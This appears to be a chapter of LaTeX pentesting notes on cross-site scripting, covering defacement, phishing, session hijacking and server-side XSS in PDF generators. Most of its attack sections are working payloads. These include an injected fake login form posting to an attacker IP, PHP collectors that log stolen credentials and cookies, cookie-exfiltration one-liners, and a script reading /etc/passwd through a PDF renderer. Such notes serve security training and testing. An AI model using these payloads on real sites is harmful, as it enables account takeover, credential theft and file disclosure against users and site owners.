\chapter{XSS: Cross-Site Scripting}



\input{web/xss/intro}
\input{web/xss/types}
\input{web/xss/context}
\input{web/xss/discovery}
\input{web/xss/exploit}

\section{Defacing attack}
One of the most common attacks usually used with stored XSS vulnerabilities is
website defacing attacks. Defacing a website means changing its look for anyone
who visits the website. It is very common for hacker groups to deface a website
to claim that they had successfully hacked it. Such attacks can carry great
media echo and may significantly affect a company's investments and share
prices, especially for banks and technology firms.

Although many other vulnerabilities may be utilized to achieve the same thing,
stored XSS vulnerabilities are among the most used vulnerabilities for doing
so.

We can utilize injected JavaScript code (through XSS) to make a web page look
any way we like. However, defacing a website is usually used to send a simple
message (i.e., we successfully hacked you), so giving the defaced web page a
beautiful look isn't really the primary target.

Three HTML elements are usually utilized to change the main look of a web page:
\begin{itemize}
        \item Background Color \verb+document.body.style.background+
        \item Background \verb+document.body.background+
        \item Page \verb+Title document.title+
        \item Page Text \verb+DOM.innerHTML+ that should be {\bf minifyed}
\end{itemize}

We can utilize two or three of these elements to write a basic message to the
web page and even remove the vulnerable element
\verb+document.getElementById().remove()+ such that it would be more difficult
to quickly reset the web page, as we will see next.

To find the id of the HTML element to remove, one can use the {\emph Page
Inspector Picker}

Another solution more violant is to comment all the HTML after the payload 

\section{Phishing attack}
Phishing attacks usually utilize legitimate-looking information to trick the
victims into sending their sensitive information to the attacker. A common form
of XSS phishing attacks is through injecting fake login forms that send the
login details to the attacker's server, which may then be used to log in on
behalf of the victim and gain control over their account and sensitive
information.

One common vector can be a form of image viewers (type an image url to be
displayed).

The attack will consist of creating a payload that will deface the webpage and
insert a login form. The form action will send the data to a webserver owned by
the attacker.

example of payload:
\begin{verbatim}
<script>document.write('
    <h3>Please login to continue</h3>
    <form action=http://OUR_IP/index.php>
        <input type="username" name="username" placeholder="Username">
        <input type="password" name="password" placeholder="Password">
        <input type="submit" name="submit" value="Login">
    </form>');
    document.getElementById('urlform').remove();
\end{verbatim}

For the attacker server a simple nc will work but for persistance a php server
with the following code can be started:
\begin{verbatim}
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
\end{verbatim}


\section{Session hijacking attack}
There are multiple JavaScript payloads we can use to grab the session cookie
and send it to us, as shown by
\href{https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#exploit-code-or-poc}{PayloadsAllTheThings}:
\begin{verbatim}
document.location='http://OUR_IP/index.php?c='+document.cookie;
new Image().src='http://OUR_IP/index.php?c='+document.cookie;
\end{verbatim}


runing on our webserver
\begin{verbatim}
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | $key : {$cookie}\n");
        fclose($file);
    }
}
?>
\end{verbatim}


\section{Server Side XSS}

in cas a server is building a pdf an a field is reflected in the pdf it might
be vulnerable. See
\href{https://blog.appsecco.com/finding-ssrf-via-html-injection-inside-a-pdf-file-on-aws-ec2-214cc5ec5d90}{this}
and
\href{https://namratha-gm.medium.com/ssrf-to-local-file-read-through-html-injection-in-pdf-file-53711847cb2f}{this
articles}

To test:
\begin{verbatim}
<script>document.write('PWNED')</script>
\end{verbatim}

real paylod:
\begin{verbatim}
<iframe src=”http://hacker.com"></iframe>

<p id=”test”>aa</p><script>document.getElementById(‘test’).innerHTML+=’aa’</script>


<p id=”test”>aa</p><script>document.getElementById(‘test’).innerHTML+=window.location</script>

<script>
	x=new XMLHttpRequest;
	x.onload=function(){  
	document.write(this.responseText)};
	x.open("GET","file:///etc/passwd");
	x.send();
</script>
\end{verbatim}



\section{links}
